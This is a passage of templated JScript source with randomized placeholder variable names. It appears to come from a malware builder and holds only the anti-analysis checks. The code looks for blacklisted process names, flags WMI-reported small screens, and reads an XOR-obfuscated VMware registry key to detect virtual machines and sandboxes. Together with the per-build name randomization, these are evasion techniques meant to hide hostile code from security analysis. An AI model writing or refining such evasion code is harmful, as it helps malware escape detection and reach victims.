        for (var {{ v.jsc_lv_e }} = new Enumerator({{ v.jsc_lv_pq }}); !{{ v.jsc_lv_e }}.atEnd(); {{ v.jsc_lv_e }}.moveNext()) {
            var {{ v.jsc_lv_n }} = {{ v.jsc_lv_e }}.item().Name.toLowerCase();
            for (var i = 0; i < {{ v.jsc_lv_bad }}.length; i++) { if ({{ v.jsc_lv_n }} === {{ v.jsc_lv_bad }}[i]) return true; }
        }
        var {{ v.jsc_lv_mq }} = {{ v.jsc_lv_wmi }}.ExecQuery({{ v.fn_build_str }}([{{ v.jsc_wmi_monitor_q }}]));
        for (var {{ v.jsc_lv_em }} = new Enumerator({{ v.jsc_lv_mq }}); !{{ v.jsc_lv_em }}.atEnd(); {{ v.jsc_lv_em }}.moveNext()) {
            var {{ v.jsc_lv_d }} = {{ v.jsc_lv_em }}.item();
            if ({{ v.jsc_lv_d }}.ScreenWidth && {{ v.jsc_lv_d }}.ScreenWidth < 800) return true;
        }
    } catch(e) {}
    try {
        var {{ v.jsc_lv_sh }} = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_wscript_shell }}]));
        var {{ v.jsc_lv_vmr }}=[{{ jsc_vmware_reg_enc }}],{{ v.jsc_lv_vmx }}={{ jsc_vmware_reg_xk }};
        for(var {{ v.jsc_lv_ri }}=0;{{ v.jsc_lv_ri }}<{{ v.jsc_lv_vmr }}.length;{{ v.jsc_lv_ri }}++){{ v.jsc_lv_vmr }}[{{ v.jsc_lv_ri }}]^={{ v.jsc_lv_vmx }};
        {{ v.jsc_lv_sh }}.RegRead({{ v.fn_build_str }}({{ v.jsc_lv_vmr }}));
        return true;
